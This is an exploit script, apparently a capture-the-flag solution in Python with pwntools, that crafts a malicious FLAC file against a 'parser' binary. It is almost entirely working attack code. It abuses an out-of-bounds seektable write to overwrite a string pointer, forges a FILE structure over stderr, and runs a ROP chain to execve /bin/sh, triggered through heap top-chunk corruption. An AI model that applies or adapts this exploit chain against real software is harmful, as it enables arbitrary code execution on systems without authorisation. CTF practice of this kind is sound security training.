"""
For remote/docker, execve("/bin/sh", {"/bin/sh","-c", "cat /fl*"}, NULL) should work because the the parser was being ran by a python wrapper,
so we couldn't directly interact with stdin, I didn't bother writing that, and just popped a shell since I upsolved the challenge.
"""


from pwn import *

elf = context.binary = ELF('./parser')
gdb_script ="""
break *0x53ab1f
continue
"""

def start():
    if args.GDB:
        return gdb.debug([elf.path,"file.flac"], gdbscript=gdb_script)
    if args.REMOTE:
        return remote("lol",2131)
    else:
        return process(["./parser","file.flac"])

TYPE_STREAMINFO = 0
TYPE_PADDING = 1
TYPE_APPLICATION = 2
TYPE_SEEKTABLE = 3
TYPE_VORBIS_COMMENT = 4
TYPE_CUESHEET = 5
TYPE_PICTURE = 6

global flac_file
stream_info = b"\x00\x00\x00\x22\x12\x00\x12\x00\x00\x07\x7A\x00\x32\x53\x0A\xC4\x42\xF0\x00\xA4\x80\x8A\xA3\x03\x19\xF2\x4E\x70\xEB\x7F\x28\x0D\x44\x55\x90\x6A\x4B\xD1"
flac_file = b"\x66\x4C\x61\x43" + stream_info
std_cout = b""

#just a random FlacStreamInfo header ^

def add_seektable(numbers,offsets,sampleCounts):

	global flac_file
	size = len(numbers) * 18
	flac_file += p8(TYPE_SEEKTABLE) 
	flac_file += p32(size, endian = 'big')[1:]
	tableCount = len(numbers)
	for i in range(tableCount):
		flac_file += p64(numbers[i], endian = 'big')
		flac_file += p64(offsets[i], endian = 'big')
		flac_file += p16(sampleCounts[i], endian = 'big')

	return

def addBlockVorbisComment(vendor):
	global flac_file
	flac_file += p8(TYPE_VORBIS_COMMENT) 
	flac_file += p32(8+len(vendor), endian = 'big')[1:]
	size = len(vendor)
	flac_file += p32(size)
	flac_file += vendor
	flac_file += p32(0x0)
	return

numbers = [0]*1
offsets = [0]*1
sampleCounts = [0]*1
add_seektable(numbers,offsets,sampleCounts)

#The basic_string's `begin_` pointer is not mangled so just point it to some arb address, and perform an arb write

addBlockVorbisComment(b"A"*304)

fp = 0x5DC680 #stderr

numbers = [0x41]
offsets = [fp]
sampleCounts = [304]

#do the oob write
add_seektable(numbers,offsets,sampleCounts)


fileStr = FileStructure(null=0x5DD988)

fileStr.flags = p64(0x0)
fileStr._IO_read_ptr = p64(0x406b51) #pop rsp ; ret, pivot to a more favorable location
fileStr._IO_read_end = p64(fp+224)
fileStr._IO_write_base = b"/bin/sh\x00" 
fileStr._wide_data = fp - 16
payload = bytes(fileStr)
payload = bytearray(payload)
payload[208:216] = p64(0x4CF36C) #leave ; ret, at <__vfprintf_internal+271>    call   qword ptr [r12 + 0x38], rbp = fp
payload[216:224] = p64(fp+0x98)

rop_chain = p64(0x40591d) + p64(fp+32) + p64(0x4073a3) + p64(0x0) + p64(0x533dab) + p64(0x0) + p64(0x0) + p64(0x42111a) + p64(59) + p64(0x4a7fd9)

payload += rop_chain


addBlockVorbisComment(payload)

numbers = [0x40]
offsets = [0x40]
sampleCounts = [0x40]

#small top chunk size (no prev in use flag) -> sysmalloc -> malloc_assert -> fflush(stderr) 

for i in range(16):
	add_seektable(numbers,offsets,sampleCounts)


flac_file += p8(TYPE_PICTURE) 
flac_file += p32(0x30, endian = 'big')[1:] 
flac_file += p32(0x30, endian = 'big') 
flac_file += p32(0x60, endian = 'big') 
flac_file += b"A"*0x60

with open("file.flac","wb") as f:
	f.write(flac_file)

p = start()
p.interactive()
